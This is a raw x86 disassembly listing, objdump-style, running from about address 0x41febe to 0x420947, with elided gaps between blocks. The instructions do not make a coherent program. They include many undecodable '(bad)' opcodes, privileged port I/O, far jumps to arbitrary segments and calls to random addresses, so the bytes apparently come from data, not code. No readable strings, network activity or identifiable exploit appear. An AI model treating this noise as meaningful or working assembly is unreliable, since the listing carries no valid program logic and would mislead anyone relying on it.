  41febe:	and    BYTE PTR ds:0x77f56573,0x21
  41fec5:	cmp    cl,BYTE PTR fs:[edx]
  41fec8:	jo     0x41ff2f
  41feca:	in     eax,0x57
  41fecc:	dec    edi
  41fecd:	imul   edx,ebx,0xb565503a
  41fed3:	sub    DWORD PTR [edx+0x72],esp
	...
  41fefe:	add    BYTE PTR [eax],al
  41ff00:	ja     0x41ff7c
  41ff02:	fs sub eax,0x726224c2
  41ff08:	xchg   DWORD PTR [edi],eax
  41ff0a:	push   esp
  41ff0b:	add    BYTE PTR [edx-0x3db4a6dc],al
  41ff11:	push   ds
  41ff12:	pusha  
  41ff13:	push   0x6b2eb6
  41ff18:	mov    ah,0x2e
  41ff1a:	jno    0x41ff81
  41ff1c:	adc    al,0x3a
  41ff1e:	outs   dx,DWORD PTR ds:[esi]
  41ff1f:	jbe    0x41ff23
  41ff21:	and    eax,0x8e3e251d
  41ff26:	fcom   DWORD PTR [eax-0x80]
  41ff29:	push   eax
  41ff2a:	aam    0xff
  41ff2c:	jge    0x41fed5
  41ff2e:	call   0xc2e1a5a5
  41ff33:	push   ebx
  41ff34:	mov    es,WORD PTR [esi+esi*8]
  41ff37:	xchg   dx,ax
  41ff39:	lahf   
  41ff3a:	cmc    
  41ff3b:	sub    eax,0xffe86f96
  41ff40:	jo     0x41ffa1
  41ff42:	out    0x1f,al
  41ff44:	jp     0x41ffa9
  41ff46:	lock pop esi
  41ff48:	ds js  0x41ff34
  41ff4b:	fs addr16 jb 0x41ff73
  41ff4f:	inc    esp
  41ff50:	pop    edi
  41ff51:	adc    ah,ah
  41ff53:	dec    DWORD PTR [ebx+esi*2+0x5f5266c8]
  41ff5a:	and    al,0x66
  41ff5c:	popa   
  41ff5d:	ss call 0x35a651c1
	...
  41ff8b:	add    BYTE PTR [eax],al
  41ff8d:	add    BYTE PTR [edx+0x23],cl
  41ff90:	jecxz  0x41fffd
  41ff92:	and    eax,DWORD PTR [ecx+ebp*1]
  41ff95:	add    BYTE PTR [edi+0x4],ah
  41ff98:	and    DWORD PTR [eax],eax
  41ff9a:	std    
  41ff9b:	enter  0x50c6,0xa
  41ff9f:	test   bl,0x46
  41ffa2:	or     al,dh
  41ffa4:	add    BYTE PTR [eax-0x14],dl
  41ffa7:	retf   0x3ec7
  41ffaa:	in     al,dx
  41ffab:	sbb    al,BYTE PTR [ecx]
  41ffad:	push   ebx
  41ffae:	lock mov edx,0x40352d3
  41ffb4:	mov    BYTE PTR [edi-0x5],0xc4
  41ffb8:	int    0xff
  41ffba:	add    ecx,ecx
  41ffbc:	rol    BYTE PTR [edx-0x9],cl
  41ffbf:	enter  0xffc6,0x59
  41ffc3:	cwde   
  41ffc4:	jmp    0x49f5:0x555ae764
  41ffcb:	mov    DWORD PTR [ecx-0x15],ebx
  41ffce:	fiadd  DWORD PTR [ebx-0x725326bb]
  41ffd4:	cmp    eax,DWORD PTR [esi+ebp*4]
  41ffd7:	jl     0x420013
  41ffd9:	cmc    
  41ffda:	mov    dl,0x8a
  41ffdc:	cmp    eax,esp
  41ffde:	adc    BYTE PTR [ecx-0x7f7317b8],0xe7
  41ffe5:	out    dx,al
  41ffe6:	mov    es,WORD PTR [eax-0x779715e7]
  41ffec:	add    al,0xd9
  41ffee:	mov    edi,DWORD PTR [ebx+eax*1-0x11]
	...
  42001a:	add    BYTE PTR [eax],al
  42001c:	pop    esp
  42001d:	pop    ebx
  42001e:	add    eax,0xd65561f0
  420023:	sub    BYTE PTR [esi],bh
  420025:	xor    ebx,0xffffffef
  420028:	push   ecx
  420029:	push   ebp
  42002a:	(bad)  
  42002b:	sub    BYTE PTR [esi],bh
  42002d:	xor    ebx,0xffffffef
  420030:	popa   
  420031:	mov    fs,WORD PTR [ecx]
  420033:	sub    DWORD PTR [ebx],ebx
  420035:	pop    ebx
  420036:	mov    ebx,0xce8a52c0
  42003b:	out    0x1c,eax
  42003d:	mov    bh,0xaa
  42003f:	jmp    0x420070
  420041:	mov    dl,ah
  420043:	fisubr WORD PTR [ecx+0x2febaab5]
  420049:	mov    al,ah
  42004b:	jmp    0x82fe:0xd7e7880c
  420052:	cdq    
  420053:	call   0xe7f9806c
  420058:	or     al,0x8e
  42005a:	out    0xd4,eax
  42005c:	jmp    0x8c8d:0x10f09380
  420063:	xlat   BYTE PTR ds:[ebx]
  420064:	inc    BYTE PTR [edx+0x7fd4e879]
  42006a:	add    BYTE PTR [ecx-0x168e739f],bl
  420070:	test   BYTE PTR [edi-0x7aa2a28f],al
  420076:	ins    BYTE PTR es:[edi],dx
  420077:	ds jle 0x41fffa
  42007a:	jb     0x420065
  42007c:	adc    DWORD PTR [ebx+0x3e72],ebx
	...
  4200aa:	sbb    DWORD PTR [edx-0x48bdab8d],eax
  4200b0:	dec    esi
  4200b1:	push   eax
  4200b2:	sbb    eax,DWORD PTR [ecx+0x7e214672]
  4200b8:	add    BYTE PTR ds:0x166b87fb,cl
  4200be:	push   ds
  4200bf:	mov    BYTE PTR [eax],al
  4200c1:	cmp    eax,0x26187e8
  4200c6:	add    DWORD PTR [esi+0x6c],edi
  4200c9:	adc    eax,0x342ba23a
  4200ce:	or     DWORD PTR [ebp+0x18d40e63],eax
  4200d4:	pop    ecx
  4200d5:	and    ah,BYTE PTR [ecx]
  4200d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200d8:	arpl   bp,di
  4200da:	lock xchg DWORD PTR [esi-0x17],ebp
  4200de:	icebp  
  4200df:	test   al,0x72
  4200e1:	into   
  4200e2:	fild   WORD PTR [ecx+0x18b2cc6c]
  4200e8:	inc    esp
  4200e9:	fldenv [ebx+edi*2-0x77175b00]
  4200f0:	addr16 retf 0x9d89
  4200f4:	jo     0x4200b6
  4200f6:	mov    ds:0x9cb55218,al
  4200fb:	jle    0x420163
  4200fd:	aam    0x7f
  4200ff:	lods   al,BYTE PTR ds:[esi]
  420100:	push   eax
  420101:	jmp    0x8cb68290
  420106:	jb     0x42014e
  420108:	addr16 jg 0x42016f
  42010b:	sbb    BYTE PTR [ecx+0x0],bl
	...
  420136:	add    BYTE PTR [eax],al
  420138:	les    eax,FWORD PTR ds:0x5be46571
  42013e:	pop    esp
  42013f:	push   esi
  420140:	mov    esi,0xd063660f
  420145:	add    BYTE PTR ds:0x65fafa4d,bl
  42014b:	popa   
  42014c:	push   edi
  42014d:	ds data16 je 0x4200e8
  420151:	pop    edi
  420152:	dec    edi
  420153:	add    BYTE PTR [edx+0x5f],bh
  420156:	je     0x420158
  420158:	imul   ebx,DWORD PTR [edi+0x65],0x0
  42015c:	jno    0x4201bd
  42015e:	arpl   WORD PTR [eax],ax
  420160:	push   esp
  420161:	pop    edi
  420162:	add    BYTE PTR [eax],al
  420164:	inc    ebx
  420165:	fsubr  DWORD PTR [eax+0x6f]
  420168:	xor    eax,0x5b2068fe
  42016d:	add    BYTE PTR [esi+ebp*2+0x43],dh
  420171:	add    BYTE PTR [esi+0x64],bl
  420174:	cmp    cl,BYTE PTR ds:0x413252fd
  42017a:	pop    ebp
  42017b:	jb     0x4201b1
  42017d:	pop    es
  42017e:	std    
  42017f:	inc    ebp
  420180:	aad    0xfa
  420182:	outs   dx,DWORD PTR ds:[esi]
  420183:	push   0x4d2b19
  420188:	xor    DWORD PTR [edx+ecx*2],ebp
  42018b:	inc    esi
  42018c:	xlat   BYTE PTR ds:[ebx]
  42018d:	sbb    DWORD PTR [ecx+0x61],ebp
  420190:	(bad)  
  420191:	cli    
  420192:	inc    edx
  420193:	je     0x42012c
  420195:	pop    ebx
  420196:	outs   dx,DWORD PTR ds:[esi]
  420197:	imul   ebp,ebx,0x642afa
	...
  4201c5:	add    BYTE PTR [esi+0x7],dh
  4201c8:	std    
  4201c9:	dec    ebx
  4201ca:	xchg   BYTE PTR [ecx+esi*2],cl
  4201cd:	push   eax
  4201ce:	xchg   BYTE PTR [eax+esi*2],cl
  4201d1:	ja     0x420183
  4201d3:	or     DWORD PTR [ecx+0x0],esp
  4201d6:	sar    esi,cl
  4201d8:	outs   dx,DWORD PTR ds:[esi]
  4201d9:	je     0x420219
  4201db:	ret    
  4201dc:	fsub   QWORD PTR [ebx-0x14]
  4201df:	fdivrp st(1),st
  4201e1:	jo     0x420221
  4201e3:	into   
  4201e4:	jecxz  0x420256
  4201e6:	jmp    0xc501:0xcc62f1ee
  4201ed:	pop    esi
  4201ee:	int    0x8d
  4201f0:	shr    DWORD PTR [esp+ecx*8-0x4b],1
  4201f4:	add    al,0x51
  4201f6:	rcr    DWORD PTR [edi-0x4d608b10],1
  4201fc:	fistp  WORD PTR [ebx+0x78]
  4201ff:	pop    eax
  420200:	jecxz  0x420272
  420202:	xchg   esi,eax
  420203:	je     0x4201e4
  420205:	pop    esi
  420206:	xchg   ebp,eax
  420207:	js     0x4201cb
  420209:	imul   ebx,DWORD PTR [edi-0x75ba20b6],0x54
  420210:	fcom   DWORD PTR [eax-0x5d]
  420213:	js     0x420205
  420215:	xchg   ax,ax
  420217:	pop    ebp
  420218:	icebp  
  420219:	call   DWORD PTR [ebp+0x745ee842]
  42021f:	pop    edi
  420220:	mov    esi,0x23046e73
  420225:	data16 outs dx,BYTE PTR ds:[esi]
  420227:	push   0x4604
	...
  420254:	jb     0x4202ca
  420256:	sub    DWORD PTR [ecx],ebp
  420258:	and    BYTE PTR [eax-0x15],bh
  42025b:	ins    DWORD PTR es:[edi],dx
  42025c:	push   ebp
  42025d:	and    dl,dh
  42025f:	addr16 pop ebx
  420261:	sub    ch,ah
  420263:	pop    ebx
  420264:	sub    DWORD PTR [eax+eiz*8],esi
  420267:	ins    DWORD PTR es:[edi],dx
  420268:	adc    ah,BYTE PTR [ecx]
  42026a:	out    0x6a,al
  42026c:	sbb    esp,DWORD PTR [ebx]
  42026e:	jecxz  0x4202d3
  420270:	ds mov ebp,0xf3f245e5
  420276:	add    BYTE PTR [ecx+0x21],al
  420279:	(bad)  
  42027a:	loop   0x4202de
  42027c:	sbb    eax,0x12ec9b5b
  420281:	test   DWORD PTR [edx-0x646d0ddb],ebx
  420287:	add    ebp,DWORD PTR [edi]
  420289:	lahf   
  42028a:	mov    esp,0xe7ab0dbd
  42028f:	repnz fmul DWORD PTR [esi-0x7bd40d7c]
  420296:	test   esp,ebp
  420298:	push   ecx
  420299:	mov    dl,0xba
  42029b:	mov    edi,0xd43b9d14
  4202a0:	inc    ecx
  4202a1:	mov    dl,0x3a
  4202a3:	jmp    0x420252
  4202a5:	sub    BYTE PTR [ebx],0xdf
  4202a8:	scas   al,BYTE PTR es:[edi]
  4202a9:	test   BYTE PTR [esi-0x1a],al
  4202ac:	pushf  
  4202ad:	mov    edi,esp
  4202af:	shl    BYTE PTR [edx-0x63],1
  4202b2:	adc    ecx,ebp
  4202b4:	pop    eax
  4202b5:	test   eax,0xd82c
	...
  4202e2:	jle    0x42026b
  4202e4:	dec    eax
  4202e5:	icebp  
  4202e6:	mov    es,WORD PTR [eax-0x6b9227e6]
  4202ec:	pop    ss
  4202ed:	fild   WORD PTR [ebp+0x76d80984]
  4202f3:	popf   
  4202f4:	shl    BYTE PTR [ebx],1
  4202f6:	xor    cl,BYTE PTR [edx+0x2a]
  4202f9:	cmp    al,0x26
  4202fb:	dec    eax
  4202fc:	and    eax,0xc449802e
  420301:	xor    cl,BYTE PTR [esi]
  420303:	dec    esp
  420304:	sub    BYTE PTR [edi],ah
  420306:	or     DWORD PTR [edx-0x56],ecx
  420309:	cmp    dl,BYTE PTR ds:0x6e341f4b
  42030f:	dec    ecx
  420310:	test   eax,0x104ef831
  420315:	mov    esi,0x32a397ff
  42031a:	push   eax
  42031b:	dec    ecx
  42031c:	fwait
  42031d:	xor    edi,edx
  42031f:	lea    eax,[eax]
  420321:	rcr    BYTE PTR [ebx-0x3716cdb6],0xb4
  420328:	jno    0x4202ca
  42032a:	ret    
  42032b:	test   eax,0xa791e950
  420330:	arpl   WORD PTR [ebp-0x778d4b72],bx
  420336:	arpl   WORD PTR [esi+0x0],di
  420339:	xlat   BYTE PTR ds:[ebx]
  42033a:	gs jg  0x4203ad
  42033d:	jmp    0x79a68c65
  420342:	cmp    eax,0x9b43af
	...
  42036f:	add    BYTE PTR [eax+0x1b3f52aa],al
  420375:	inc    ecx
  420376:	add    BYTE PTR [ecx+0x1d],bl
  420379:	mov    WORD PTR [ecx+0x5e],?
  42037c:	sbb    ecx,DWORD PTR [ebx+0x44590964]
  420382:	cmp    cl,BYTE PTR [ebx+0x64]
  420385:	pop    ebx
  420386:	jae    0x4203c2
  420388:	stc    
  420389:	mov    ch,BYTE PTR [esi+0x48]
  42038c:	sbb    DWORD PTR [edx+0x3a],edi
  42038f:	cmp    al,BYTE PTR [ebx+ebx*2+0x66]
  420393:	sbb    al,0x16
  420395:	and    DWORD PTR [eax],0x7278de08
  42039b:	or     al,0xef
  42039d:	mov    edi,DWORD PTR [edx]
  42039f:	sbb    ah,BYTE PTR [ebx+ebx*2]
  4203a2:	cs jmp 0x2c949d99
  4203a8:	out    dx,eax
  4203a9:	stos   BYTE PTR es:[edi],al
  4203aa:	push   esi
  4203ab:	(bad)  
  4203ac:	cmp    eax,0x2219549d
  4203b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203b2:	ins    DWORD PTR es:[edi],dx
  4203b3:	fidivr WORD PTR ds:0x83b9549d
  4203b9:	xchg   DWORD PTR [ebp-0x17],esi
  4203bc:	scas   al,BYTE PTR es:[edi]
  4203bd:	jge    0x420433
  4203bf:	les    ebp,FWORD PTR [esi-0x75ff87ba]
  4203c5:	cld    
  4203c6:	cld    
  4203c7:	push   edx
  4203c8:	call   0xe69954a3
  4203cd:	sub    al,BYTE PTR [edx+0x5c]
  4203d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203d1:	call   FWORD PTR [esi+0x6f]
	...
  4203fc:	add    BYTE PTR [eax],al
  4203fe:	push   0xffffffd6
  420400:	push   eax
  420401:	push   eax
  420402:	xchg   DWORD PTR [ebx+0x2e],ecx
  420405:	aaa    
  420406:	stos   DWORD PTR es:[edi],eax
  420407:	sub    esp,DWORD PTR [eax+0x72]
  42040a:	mov    esi,0x57737108
  42040f:	sub    ecx,DWORD PTR [esi+eax*2-0x4d]
  420413:	daa    
  420414:	ds push edx
  420416:	mov    ds:0xb56f4f2c,al
  42041b:	jmp    FWORD PTR [ecx]
  42041d:	inc    esi
  42041e:	add    ebp,DWORD PTR [edi]
  420420:	sbb    eax,0x5c504933
  420425:	inc    esi
  420426:	jae    0x420457
  420428:	push   eax
  420429:	test   DWORD PTR gs:[ecx],edx
  42042c:	bound  esi,QWORD PTR [edx+0x64]
  42042f:	pop    edi
  420430:	inc    esi
  420431:	push   esp
  420432:	aaa    
  420433:	aas    
  420434:	aas    
  420435:	outs   dx,DWORD PTR ds:[esi]
  420436:	push   edx
  420437:	stc    
  420438:	jo     0x42043a
  42043a:	popa   
  42043b:	xor    ecx,DWORD PTR [ebp+0x20]
  42043e:	push   ecx
  42043f:	imul   esp,DWORD PTR ss:[ebp+0x2],0x464ffcfc
  420447:	or     al,0x70
  420449:	ja     0x420433
  42044b:	or     eax,0x2440061
  420450:	outs   dx,DWORD PTR ds:[esi]
  420451:	jbe    0x420495
  420453:	or     eax,0x23a614b
  420458:	std    
  420459:	push   esp
  42045a:	les    eax,FWORD PTR [edx]
  42045c:	outs   dx,DWORD PTR ds:[esi]
  42045d:	dec    ecx
  42045e:	xchg   ebx,eax
  42045f:	push   edi
  420460:	inc    ebp
  420461:	outs   dx,BYTE PTR ds:[esi]
	...
  42048a:	add    BYTE PTR [eax],al
  42048c:	mov    cs,WORD PTR [ebx]
  42048e:	popaw  
  420490:	ds push ds
  420492:	lds    esp,FWORD PTR [esi+0x2c]
  420495:	pop    ds
  420496:	out    0x73,al
  420498:	adc    eax,edx
  42049a:	jmp    0x42049b
  42049c:	or     DWORD PTR ds:0xd70073f3,esp
  4204a2:	fbld   TBYTE PTR [ecx+0x23]
  4204a5:	rol    BYTE PTR [eax],1
  4204a7:	push   ecx
  4204a8:	sbb    esi,eax
  4204aa:	mul    BYTE PTR [edx-0x14]
  4204ad:	int    0xeb
  4204af:	outs   dx,DWORD PTR ds:[esi]
  4204b0:	fild   DWORD PTR [ecx]
  4204b2:	adc    DWORD PTR [eax],eax
  4204b4:	add    bh,BYTE PTR ds:[eax+ebp*2-0x1]
  4204b9:	add    ebx,ebx
  4204bb:	bound  ebp,QWORD PTR [edi+0x2458496]
  4204c1:	sbb    eax,0xa241d7b7
  4204c6:	ins    BYTE PTR es:[edi],dx
  4204c7:	jecxz  0x420536
  4204c9:	mov    ds:0x763e56bf,eax
  4204ce:	and    dh,BYTE PTR [ebx]
  4204d0:	pusha  
  4204d1:	jbe    0x4204fe
  4204d3:	cs ins DWORD PTR es:[edi],dx
  4204d5:	imul   eax,DWORD PTR [eax+esi*1],0x28f90234
  4204dc:	inc    eax
  4204dd:	add    ecx,DWORD PTR [eax]
  4204df:	add    edi,DWORD PTR [ecx]
  4204e1:	add    eax,0x516d0006
  4204e6:	jmp    0x9a62:0xf6638973
  4204ed:	inc    eax
  4204ee:	fld    TBYTE PTR [ebp+0x0]
	...
  420519:	add    BYTE PTR [edi+0x75],bl
  42051c:	retf   0x8e53
  42051f:	inc    eax
  420520:	aad    0x66
  420522:	push   0x5f
  420524:	and    al,0x4b
  420526:	pop    edi
  420527:	(bad)
  42052c:	add    DWORD PTR [eax+0x59],ecx
  42052f:	adc    eax,0x5b6afff5
  420534:	(bad)  
  420536:	das    
  420537:	pop    ebx
  420538:	mov    bh,0xe4
  42053a:	cs mov fs,edi
  42053d:	rcr    DWORD PTR [edx],cl
  42053f:	(bad)  
  420540:	rol    DWORD PTR [ebx],cl
  420542:	or     al,0x78
  420544:	aam    0xe2
  420546:	or     eax,0x18c80778
  42054b:	(bad)  
  42054c:	out    0xcf,eax
  42054e:	(bad)  
  42054f:	xchg   ebx,eax
  420550:	leave  
  420551:	call   0xe6de7c65
  420556:	out    0x5a,al
  420558:	int    0xe7
  42055a:	in     al,dx
  42055b:	jge    0x4204df
  42055d:	add    ebp,ebp
  42055f:	lea    eax,[ebp+esi*8-0x1e6981ed]
  420566:	jecxz  0x4204eb
  420568:	xchg   BYTE PTR [ebx],al
  42056a:	adc    cl,BYTE PTR [esi-0x7c320874]
  420570:	jge    0x42055c
  420572:	and    DWORD PTR [ecx+0x509cdf48],eax
  420578:	or     DWORD PTR [esp+ebx*2],eax
  42057b:	pop    ebx
  42057c:	pop    ebp
  42057d:	jecxz  0x42057f
	...
  4205a7:	add    BYTE PTR [ebp+0x5c2f4488],dl
  4205ad:	pop    ebx
  4205ae:	sbb    ah,cl
  4205b0:	mov    ds:0x8fe33687,eax
  4205b5:	js     0x4205ca
  4205b7:	aad    0xa0
  4205b9:	cmp    BYTE PTR [esi],0xe2
  4205bc:	ins    DWORD PTR es:[edi],dx
  4205bd:	jl     0x4205da
  4205bf:	fcomp  QWORD PTR [eax+0x6cd43b80]
  4205c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205c6:	cmp    ecx,ebx
  4205c8:	test   DWORD PTR [esi-0x7b910afc],ebp
  4205ce:	push   ss
  4205cf:	loop   0x42061f
  4205d1:	pop    ebx
  4205d2:	das    
  4205d3:	loope  0x420623
  4205d5:	xchg   DWORD PTR [eax],eax
  4205d7:	daa    
  4205d8:	fld    QWORD PTR [ebx+eiz*2+0x638ae8e9]
  4205df:	fstp   TBYTE PTR [edi-0x50]
  4205e2:	imul   eax,esp,0x3d
  4205e5:	stos   DWORD PTR es:[edi],eax
  4205e6:	pop    edi
  4205e7:	fidiv  DWORD PTR [edx-0x6624927a]
  4205ed:	adc    DWORD PTR [ebp-0x2a],ecx
  4205f0:	xchg   ebx,eax
  4205f1:	lea    ecx,[esi-0x4c]
  4205f4:	jo     0x420671
  4205f6:	arpl   WORD PTR [ebx-0x449c58c3],di
  4205fc:	pusha  
  4205fd:	js     0x42066d
  4205ff:	mov    BYTE PTR [ecx+0x589977ad],bl
  420605:	adc    DWORD PTR [ebx-0x67],ecx
  420608:	ins    DWORD PTR es:[edi],dx
  420609:	xchg   edi,eax
  42060a:	push   esp
  42060b:	mov    ecx,0x0
	...
  420634:	add    BYTE PTR [eax],al
  420636:	pop    ds
  420637:	xchg   ebx,eax
  420638:	imul   edx,DWORD PTR [ebp-0x71b150c3],0x49
  42063f:	jl     0x4206b1
  420641:	mov    BYTE PTR [ecx+0x42],ah
  420644:	sub    ecx,ebp
  420646:	push   0x7e
  420648:	pop    bp
  42064a:	aaa    
  42064b:	mov    dl,0x72
  42064d:	inc    esp
  42064e:	push   cs
  42064f:	pushf  
  420650:	ins    DWORD PTR es:[edi],dx
  420651:	dec    edi
  420652:	adc    al,0x7e
  420654:	arpl   WORD PTR [edx],bp
  420656:	sub    DWORD PTR [ecx+0x771f1a20],eax
  42065c:	je     0x420694
  42065e:	sbb    eax,0xf7e9638b
  420663:	lods   al,BYTE PTR ds:[esi]
  420664:	push   eax
  420665:	or     DWORD PTR [esi],edx
  420667:	jle    0x4206da
  420669:	sbb    eax,0x155f7f15
  42066e:	adc    eax,0xf2c96e80
  420673:	jge    0x4206e7
  420675:	pop    ss
  420676:	(bad)  [edx+0x33290000]
  42067c:	dec    ebp
  42067d:	and    BYTE PTR [ebx],bh
  42067f:	clc    
  420680:	outs   dx,DWORD PTR ds:[esi]
  420681:	je     0x4206c1
  420683:	std    
  420684:	pop    ebp
  420685:	je     0x4206c5
  420687:	cli    
  420688:	push   0x20
  42068a:	call   0x5122:0xa7726207
  420691:	push   eax
  420692:	aaa    
  420693:	add    esp,DWORD PTR [edx+0x73]
  420696:	mov    esi,DWORD PTR ds:0x616b
	...
  4206c4:	(bad)  ds:0x7476e6c
  4206ca:	pop    esi
  4206cb:	jae    0x420691
  4206cd:	adc    ebp,DWORD PTR [edx+esi*2+0x7b]
  4206d1:	pop    esp
  4206d2:	inc    esi
  4206d3:	push   esp
  4206d4:	mov    bh,0x3c
  4206d6:	fs gs aam 0x8
  4206da:	data16 outs dx,BYTE PTR ds:[esi]
  4206dc:	mov    dh,0x8
  4206de:	outs   dx,WORD PTR ds:[esi]
  4206e0:	loope  0x42071d
  4206e2:	jo     0x420753
  4206e4:	aad    0x7
  4206e6:	std    
  4206e7:	inc    ebp
  4206e8:	stos   DWORD PTR es:[edi],eax
  4206e9:	sub    al,0x1d
  4206eb:	fs mov edx,0xc1697107
  4206f1:	cld    
  4206f2:	jo     0x42075d
  4206f4:	nop
  4206f5:	xor    DWORD PTR ds:0x5e138663,ebx
  4206fb:	ins    BYTE PTR es:[edi],dx
  4206fc:	cmp    al,0xfc
  4206ff:	inc    ebp
  420700:	imul   esp,DWORD PTR [edi],0x1d
  420703:	jo     0x42075a
  420705:	xor    BYTE PTR [ebx+0x69],ah
  420708:	add    DWORD PTR [edx],0x70
  42070b:	add    BYTE PTR [ecx+0x33],bl
  42070e:	dec    ebp
  42070f:	push   ebx
  420710:	jg     0x420714
  420712:	imul   ebp,DWORD PTR [edi+eiz*8-0xb],0x2f547070
  42071a:	bound  ebp,QWORD PTR [esi+edi*1+0x56]
  42071e:	push   ds
  42071f:	ins    WORD PTR es:[edi],dx
  420721:	pop    ebx
  420722:	add    al,0x51
  420724:	imul   esp,DWORD PTR [eax-0x8],0x74
	...
  42074f:	add    BYTE PTR [eax],al
  420751:	add    BYTE PTR [edi+0x14],bl
  420754:	call   0xd18582b4
  420759:	sub    ch,BYTE PTR [ebp+0x11]
  42075c:	jecxz  0x4207d1
  42075e:	sbb    al,al
  420760:	aam    0x4f
  420762:	pop    es
  420763:	and    bl,ah
  420765:	ins    BYTE PTR es:[edi],dx
  420766:	or     dl,ch
  420768:	out    0x73,eax
  42076a:	sub    esi,DWORD PTR [edx]
  42076c:	add    DWORD PTR [edi+ebx*1-0x32],eax
  420770:	jecxz  0x4207b5
  420772:	daa    
  420773:	aam    0x0
  420775:	pop    esp
  420776:	add    dh,ch
  420778:	rol    BYTE PTR [esi+0x10],1
  42077b:	sbb    dh,bl
  42077d:	dec    DWORD PTR [edi+ebx*8]
  420780:	out    dx,al
  420781:	jne    0x42075e
  420783:	repz mov esp,0x1aeded66
  420789:	js     0x42075e
  42078b:	lea    eax,[ecx]
  42078d:	dec    esi
  42078e:	jecxz  0x420769
  420790:	div    DWORD PTR [eax-0x8]
  420793:	jmp    0x6ff4:0xe03e62dc
  42079a:	int    0xda
  42079c:	hlt    
  42079d:	bound  ebp,QWORD PTR [eax-0x55]
  4207a0:	fisub  WORD PTR [esi+0x3e]
  4207a3:	ss jecxz 0x420816
  4207a6:	mov    dl,0x51
  4207a8:	clc    
  4207a9:	ins    BYTE PTR es:[edi],dx
  4207aa:	nop
  4207ab:	xchg   edi,eax
  4207ac:	and    al,0x42
  4207ae:	mov    WORD PTR [ebp+0x529b70f5],fs
  4207b4:	add    al,0x46
	...
  4207de:	add    BYTE PTR [eax],al
  4207e0:	jb     0x420856
  4207e2:	shl    BYTE PTR [esi-0x73],0x48
  4207e6:	push   ds
  4207e7:	fs pop esp
  4207e9:	pop    ebx
  4207ea:	out    0xcf,eax
  4207ec:	test   BYTE PTR [edi+edx*1-0x20],bh
  4207f0:	pop    esp
  4207f1:	stos   BYTE PTR es:[edi],al
  4207f2:	sbb    edi,ecx
  4207f4:	pop    ebp
  4207f5:	test   dh,bh
  4207f7:	iret   
  4207f8:	jle    0x42077d
  4207fa:	stc    
  4207fb:	fisub  WORD PTR [eax+edi*2+0x17]
  4207ff:	loopne 0x42084d
  420801:	mov    ah,bh
  420803:	rcl    BYTE PTR [edx+0x75],cl
  420806:	repz neg BYTE PTR [eax]
  420809:	mov    esp,ecx
  42080b:	iret   
  42080c:	add    eax,DWORD PTR [edx+ecx*8-0x375fb622]
  420813:	fiadd  DWORD PTR [ecx-0x66]
  420816:	mov    esi,0xbb8829e0
  42081b:	fsub   QWORD PTR [ebx]
  42081d:	jbe    0x4207ba
  42081f:	(bad)  
  420820:	and    BYTE PTR [ebp-0x6f],bh
  420823:	fcom   QWORD PTR [ecx]
  420825:	scas   eax,DWORD PTR es:[edi]
  420826:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420827:	xlat   BYTE PTR ds:[ebx]
  420828:	or     DWORD PTR [ebx-0x46],ebx
  42082b:	(bad)  
  42082d:	xchg   BYTE PTR [esi-0x4c88101c],dl
  420833:	mov    ebp,0x237e79d8
  420838:	add    eax,0xff23927c
  42083d:	jge    0x4207cb
  42083f:	repz int3 
  420841:	xchg   BYTE PTR [eax+0xdd],al
	...
  42086b:	add    BYTE PTR [eax],al
  42086d:	add    dl,bl
  42086f:	scas   al,BYTE PTR es:[edi]
  420870:	xchg   esi,eax
  420871:	fsubr  QWORD PTR [ebx-0x6a0baf4f]
  420877:	sbb    BYTE PTR [ecx-0x9],0x85
  42087b:	add    DWORD PTR [esi-0x1e],0xdb3a5bae
  420882:	lea    edi,[eax-0x19]
  420885:	(bad)  
  420886:	mov    ?,WORD PTR [eax+0x39]
  420889:	mov    ebx,0x31005b7d
  42088e:	sbb    BYTE PTR [edx+0xdef465f],al
  420894:	dec    ebp
  420895:	push   ss
  420896:	in     al,dx
  420897:	mov    DWORD PTR [eax],eax
  420899:	daa    
  42089a:	or     eax,DWORD PTR [edx+0xdec0c64]
  4208a0:	sub    edx,DWORD PTR [esi]
  4208a2:	hlt    
  4208a3:	ja     0x4208a5
  4208a5:	(bad)  
  4208a6:	hlt    
  4208a7:	jg     0x42090c
  4208a9:	add    DWORD PTR [ecx],ebx
  4208ab:	cmp    DWORD PTR [eax],eax
  4208ad:	retf   
  4208ae:	and    cl,BYTE PTR [ebp+0x0]
  4208b1:	or     eax,0xcd6eac85
  4208b6:	cwde   
  4208b7:	test   DWORD PTR [eax],eax
  4208b9:	lods   al,BYTE PTR ds:[esi]
  4208ba:	xchg   esp,eax
  4208bb:	ins    DWORD PTR es:[edi],dx
  4208bc:	inc    esi
  4208bd:	mov    ebp,0xdb6d0d8d
  4208c2:	jp     0x420847
  4208c4:	arpl   dx,cx
  4208c6:	mov    DWORD PTR [edi],edi
  4208c8:	addr16 iret 
  4208ca:	fs or  eax,0x8160b12b
  4208d0:	add    BYTE PTR [edx+0x0],dh
	...
  4208fa:	add    BYTE PTR [eax],al
  4208fc:	xor    al,BYTE PTR [edi+0x46]
  4208ff:	scas   eax,DWORD PTR es:[edi]
  420900:	sub    al,0x48
  420902:	xor    ecx,ebx
  420904:	dec    eax
  420905:	cdq    
  420906:	das    
  420907:	scas   eax,DWORD PTR es:[edi]
  420908:	das    
  420909:	inc    edx
  42090a:	xor    al,0xa5
  42090c:	and    eax,0xfc02b53
  420911:	inc    ebp
  420912:	inc    edx
  420913:	int3   
  420914:	or     al,0x4a
  420916:	ss mov cl,0x7b
  420919:	dec    esp
  42091a:	inc    ebx
  42091b:	mov    bh,0x6c
  42091d:	xchg   edi,eax
  42091e:	inc    edx
  42091f:	push   ds
  420920:	and    DWORD PTR ds:0xae304e4b,ecx
  420926:	inc    esi
  420927:	cmp    eax,0x4b643f0a
  42092c:	inc    edx
  42092d:	scas   eax,DWORD PTR es:[edi]
  42092e:	inc    edi
  42092f:	add    BYTE PTR [ecx+0x2a],cl
  420932:	ins    BYTE PTR es:[edi],dx
  420933:	push   bx
  420935:	push   es
  420936:	pop    esi
  420937:	jb     0x4209ab
  420939:	sub    ecx,DWORD PTR [ebx+0x6f]
  42093c:	xor    eax,edi
  42093e:	inc    edx
  42093f:	push   esp
  420940:	aaa    
  420941:	push   edi
  420942:	outs   dx,DWORD PTR cs:[esi]
  420944:	inc    edx
  420945:	clc    
  420946:	pop    edi
  420947:	arpl   WORD PTR [eax],di
